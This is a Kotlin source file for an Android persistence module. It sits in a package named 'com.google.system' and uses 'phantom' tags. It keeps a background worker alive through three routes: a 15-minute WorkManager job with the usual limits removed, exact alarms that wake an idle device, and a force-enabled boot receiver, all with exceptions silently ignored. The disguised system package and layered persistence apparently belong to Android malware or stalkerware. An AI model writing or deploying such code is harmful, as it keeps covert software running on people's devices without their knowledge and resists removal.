package com.google.system

import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

object PersistenceManager {
    
    private const val WORKER_TAG = "phantom_persistence"
    private const val ALARM_TAG = "phantom_alarm"
    private const val JOB_TAG = "phantom_job"
    
    fun setupAll(context: Context) {
        setupWorkManagerPersistence(context)
        setupAlarmPersistence(context)
        setupBootReceiver(context)
    }
    
    private fun setupWorkManagerPersistence(context: Context) {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(false)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false)
                .setRequiresStorageNotLow(false)
                .build()
            
            val workRequest = PeriodicWorkRequest.Builder(
                PersistenceWorker::class.java,
                15,
                TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .addTag(WORKER_TAG)
                .build()
            
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORKER_TAG,
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
        } catch (_: Exception) {}
    }
    
    private fun setupAlarmPersistence(context: Context) {
        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val intent = Intent(context, BootReceiver::class.java)
            val flags = android.app.PendingIntent.FLAG_UPDATE_CURRENT or
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) android.app.PendingIntent.FLAG_IMMUTABLE else 0
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context,
                0,
                intent,
                flags
            )
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 300000,
                    pendingIntent
                )
            } else {
                alarmManager.set(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 300000,
                    pendingIntent
                )
            }
        } catch (_: Exception) {}
    }
    
    private fun setupBootReceiver(context: Context) {
        try {
            val pm = context.packageManager
            val component = android.content.ComponentName(context, BootReceiver::class.java)
            pm.setComponentEnabledSetting(
                component,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }
    
    fun isPersistent(context: Context): Boolean {
        return try {
            val workManager = WorkManager.getInstance(context)
            val workInfos = workManager.getWorkInfosByTag(WORKER_TAG).get()
            workInfos.isNotEmpty()
        } catch (_: Exception) {
            false
        }
    }
}
